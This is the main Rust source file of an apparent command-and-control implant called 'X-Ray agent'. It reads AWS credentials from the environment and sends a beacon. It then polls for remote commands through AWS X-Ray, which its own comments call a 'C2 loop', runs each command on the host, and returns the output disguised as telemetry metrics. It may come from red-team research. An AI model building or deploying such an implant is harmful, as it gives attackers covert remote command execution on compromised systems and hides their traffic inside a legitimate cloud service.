use std::env;
use std::thread::sleep;
use std::time::Duration;
use tracing_subscriber;
use tracing::Level;

use crate::utils::{execute_command};

mod model;
mod utils;

// Main function now returns a Result to handle errors (like missing env vars)
fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt()
        .with_max_level(Level::INFO)
        .init();

    tracing::info!("Starting X-Ray agent...");

    // Read AWS credentials from environment variables
    let access_key =
        env::var("AWS_ACCESS_KEY_ID").expect("AWS_ACCESS_KEY_ID must be set");
    let secret_key =
        env::var("AWS_SECRET_ACCESS_KEY").expect("AWS_SECRET_ACCESS_KEY must be set");
    
    let instance_id = "rustinstance001";

    // 1. Inital beacon
    match utils::publish_metrics(instance_id, "", &access_key, &secret_key) {
        Ok(()) => {
            tracing::info!("Successfully sent initial beacon AWS X-Ray.");
        }
        Err(e) => {
            tracing::error!("Error publishing metrics: {}", e);
        }
    }

    // 2. Start polling for commands (C2 loop)
    println!("\nStarting command polling loop (pauses for 5s between checks)...");    

    loop {
        match utils::poll_configuration(instance_id, &access_key, &secret_key) {
            Ok(command) => {
                if command.is_empty() {
                    print!("."); // Indicate polling is happening
                } else {
                    tracing::info!("Command received: '{}'", command);
                    let execution_report = execute_command(&command);
                    tracing::info!("Command execution complete. Full Report:\n{}", execution_report);
                    match utils::publish_metrics(instance_id, &execution_report, &access_key, &secret_key) {
                        Ok(()) => {
                            tracing::info!("Successfully sent command response.");
                        }
                        Err(e) => {
                            tracing::error!("Error publishing metrics: {}", e);
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("\nError polling configuration: {}", e);
            }
        }
        sleep(Duration::from_secs(5));
    }

    // This part is unreachable due to the loop, but kept for clarity
    #[allow(unreachable_code)] 
    Ok(())
}